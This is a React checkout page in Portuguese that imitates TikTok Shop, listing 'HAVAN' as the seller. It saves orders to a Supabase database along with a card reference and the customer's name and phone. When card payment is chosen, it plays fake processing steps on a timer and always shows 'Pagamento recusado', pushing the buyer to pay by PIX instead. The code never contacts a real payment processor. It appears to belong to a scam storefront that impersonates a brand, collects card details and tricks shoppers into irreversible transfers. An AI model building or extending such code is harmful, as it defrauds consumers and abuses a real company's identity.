"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  Star, 
  Zap, 
  ChevronUp, 
  ChevronDown, 
  Plus, 
  Minus, 
  Ticket, 
  Loader2, 
  AlertCircle,
  Smile
} from 'lucide-react';
import { products, Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import { supabase } from "@/integrations/supabase/client";
import { showError } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [selectedVar, setSelectedVar] = useState("Padrão");
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [addressData, setAddressData] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  
  const [isProcessingCard, setIsProcessingCard] = useState(false);
  const [cardProcessingStep, setCardProcessingStep] = useState(0);
  const [cardError, setCardError] = useState(false);

  const steps = ["Finalizando compra...", "Checando dados...", "Comunicando operadora...", "Validando..."];

  useEffect(() => {
    if (location.state?.addressData) setAddressData(location.state.addressData);
    if (location.state?.cardData) {
      setCardData(location.state.cardData);
      setPaymentMethod('card');
    }
    if (location.state?.product) {
      setProduct(location.state.product);
      if (location.state.initialQuantity) setQuantity(location.state.initialQuantity);
      if (location.state.selectedVariation) setSelectedVar(location.state.selectedVariation);
    } else {
      setProduct(products[0]);
    }
  }, [location.state]);

  if (!product) return null;

  const unitPrice = parseFloat(product.currentPrice.replace(',', '.'));
  const originalPrice = parseFloat(product.originalPrice.replace(',', '.'));
  const subtotal = unitPrice * quantity;
  const originalSubtotal = originalPrice * quantity;
  const productDiscount = originalSubtotal - subtotal;
  const totalSavings = productDiscount + couponAmount;
  const finalTotal = subtotal - couponAmount;
  
  const formatPrice = (val: number) => val.toFixed(2).replace('.', ',');
  const getProductBasePath = () => `/${product.slug}`;

  const handlePlaceOrder = async () => {
    if (!addressData) {
      showError("Adicione um endereço de entrega.");
      navigate(`${getProductBasePath()}/endereco`, { state: location.state });
      return;
    }

    let orderId = null;
    try {
      const { data, error } = await supabase.from('orders').insert([{
        product_title: product?.title,
        quantity,
        total_price: formatPrice(finalTotal),
        payment_method: paymentMethod.toUpperCase(),
        card_id: paymentMethod === 'card' ? cardData?.id : null,
        address_id: addressData?.id,
        order_note: orderNote,
        status: 'PENDING',
        customer_name: addressData.name,
        customer_phone: addressData.phone
      }]).select().single();
      if (error) throw error;
      orderId = data.id;
    } catch (err) { console.error(err); }

    if (paymentMethod === 'card') {
      if (!cardData) {
        navigate(`${getProductBasePath()}/cartao`, { state: location.state });
        return;
      }
      setIsProcessingCard(true);
      let currentStep = 0;
      const interval = setInterval(() => {
        setCardProcessingStep(currentStep);
        currentStep++;
        if (currentStep >= steps.length) {
          clearInterval(interval);
          setTimeout(() => { setIsProcessingCard(false); setCardError(true); }, 1000);
        }
      }, 1200);
    } else {
      navigate(`${getProductBasePath()}/pix`, { state: { product, orderId } });
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[200px] font-sans">
      {/* Modais de Processamento e Erro */}
      {isProcessingCard && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[300px]">
            <Loader2 className="w-12 h-12 text-[#FF2C55] animate-spin" />
            <p className="text-[15px] font-bold text-center">{steps[cardProcessingStep]}</p>
          </div>
        </div>
      )}

      {cardError && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-3xl p-6 flex flex-col items-center w-full max-w-[340px]">
            <AlertCircle size={48} className="text-[#FF2C55] mb-4" />
            <h3 className="text-[18px] font-bold mb-2">Pagamento recusado</h3>
            <p className="text-[13px] text-gray-400 text-center mb-6">Tente outro cartão ou use PIX.</p>
            <div className="w-full space-y-3">
              <Button className="w-full h-12 rounded-full bg-[#FF2C55] font-bold" onClick={() => setCardError(false)}>Tentar novamente</Button>
              <Button variant="ghost" className="w-full h-10 font-bold text-gray-400" onClick={() => { setCardError(false); setPaymentMethod('pix'); }}>Pagar com PIX</Button>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white sticky top-0 z-50 border-b h-12 flex items-center px-4">
        <button onClick={() => navigate(-1)} className="p-2 -ml-2"><ArrowLeft size={24} /></button>
        <h1 className="w-full text-center text-[18px] font-bold">Resumo do Pedido</h1>
      </div>

      <div className="max-w-[600px] mx-auto">
        {/* Endereço */}
        <div className="bg-white p-4 flex items-center justify-between border-b cursor-pointer" onClick={() => navigate(`${getProductBasePath()}/endereco`, { state: location.state })}>
          <div className="flex items-center space-x-3">
            <MapPin size={20} className="text-[#00BFA5]" />
            <div className="flex flex-col">
              <span className="text-[15px] font-bold">Endereço de envio</span>
              <span className="text-[13px] text-gray-500 truncate max-w-[200px]">{addressData ? `${addressData.address}, ${addressData.number}` : "Adicionar endereço"}</span>
            </div>
          </div>
          <ChevronRight size={20} className="text-gray-300" />
        </div>

        {/* Produto */}
        <div className="bg-white mt-2 p-4">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[14px] font-bold uppercase">HAVAN</span>
            <button className="text-[13px] text-gray-400 flex items-center" onClick={() => setIsNoteDrawerOpen(true)}>
              {orderNote ? "Nota salva" : "Adicionar nota"} <ChevronRight size={16} />
            </button>
          </div>
          <div className="flex space-x-3">
            <div className="w-20 h-20 bg-[#F8F8F8] rounded-lg border p-1 shrink-0">
              <img src={product.media[0].src} className="w-full h-full object-contain" alt="" />
            </div>
            <div className="flex-grow">
              <h4 className="text-[13px] font-bold line-clamp-2">{product.title}</h4>
              <p className="text-[12px] text-gray-400">{selectedVar}</p>
              <div className="flex justify-between items-end mt-1">
                <span className="text-[16px] font-bold text-[#FF2C55]">R$ {formatPrice(unitPrice)}</span>
                <div className="flex items-center bg-[#F1F1F1] rounded h-7">
                  <button className="px-2" onClick={() => setQuantity(q => Math.max(1, q - 1))}><Minus size={14} /></button>
                  <span className="px-2 text-sm font-bold">{quantity}</span>
                  <button className="px-2" onClick={() => setQuantity(q => q + 1)}><Plus size={14} /></button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Cupom */}
        <div className="bg-white mt-2 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
          <div className="flex items-center space-x-3">
            <Ticket size={20} className="text-[#FF2C55]" />
            <span className="text-[14px] font-bold">Cupons TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-1">
            <span className="text-[13px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-2 py-0.5">- R$ {formatPrice(couponAmount)}</span>
            <ChevronRight size={18} className="text-gray-300" />
          </div>
        </div>

        {/* Resumo Valores */}
        <div className="bg-white mt-2 p-4">
          <div className="flex justify-between items-center mb-4" onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}>
            <span className="text-[15px] font-bold">Resumo</span>
            {isSubtotalOpen ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
          </div>
          {isSubtotalOpen && (
            <div className="space-y-3 pb-3 text-[14px] text-gray-500">
              <div className="flex justify-between"><span>Subtotal</span><span className="text-gray-900">R$ {formatPrice(subtotal)}</span></div>
              <div className="flex justify-between"><span>Descontos</span><span className="text-[#FF2C55]">- R$ {formatPrice(productDiscount + couponAmount)}</span></div>
            </div>
          )}
          <div className="pt-3 border-t flex justify-between items-center">
            <span className="text-[16px] font-bold">Total</span>
            <span className="text-[18px] font-bold">R$ {formatPrice(finalTotal)}</span>
          </div>
        </div>

        {/* Pagamento - Pix fica no final desta lista */}
        <div className="bg-white mt-2 p-4 space-y-4">
          <h3 className="text-[15px] font-bold">Pagamento</h3>
          
          <div className="flex items-center justify-between cursor-pointer" onClick={() => setPaymentMethod('card')}>
            <div className="flex items-center space-x-3">
              <div className="bg-[#F8F8F8] p-1 border rounded"><Plus size={14} className="text-gray-400" /></div>
              <span className="text-[14px]">{cardData ? `Cartão final ${cardData.last4}` : "Cartão de Crédito"}</span>
            </div>
            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'card' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
              {paymentMethod === 'card' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
            </div>
          </div>

          <div className="flex items-center justify-between cursor-pointer" onClick={() => setPaymentMethod('pix')}>
            <div className="flex items-center space-x-3">
              <div className="bg-[#EFFFFD] p-1 rounded"><img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" alt="Pix" /></div>
              <span className="text-[14px]">Pix</span>
            </div>
            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
              {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
            </div>
          </div>
        </div>
      </div>

      {/* RODAPÉ FIXO */}
      <div className="fixed bottom-0 left-0 right-0 z-50">
        <div className="bg-[#F8F8F8] px-4 py-2 border-t">
          <p className="text-[10px] text-gray-400">Ao pedir, você concorda com os Termos e Privacidade do TikTok Shop.</p>
        </div>
        <div className="bg-[#FFF1F3] px-4 py-2 flex items-center space-x-2 border-y border-[#FFD9E0]">
          <Smile size={16} className="text-[#FF2C55]" />
          <span className="text-[12px] font-bold text-[#FF2C55]">Você está economizando R$ {formatPrice(totalSavings)}</span>
        </div>
        <div className="bg-white p-4">
          <div className="max-w-[600px] mx-auto flex justify-between items-center gap-4">
            <div className="flex flex-col">
              <span className="text-[13px] text-gray-500">Total ({quantity})</span>
              <span className="text-[18px] font-bold text-[#FF2C55]">R$ {formatPrice(finalTotal)}</span>
            </div>
            <Button className="flex-grow bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-12 text-[16px]" onClick={handlePlaceOrder}>
              Fazer pedido
            </Button>
          </div>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;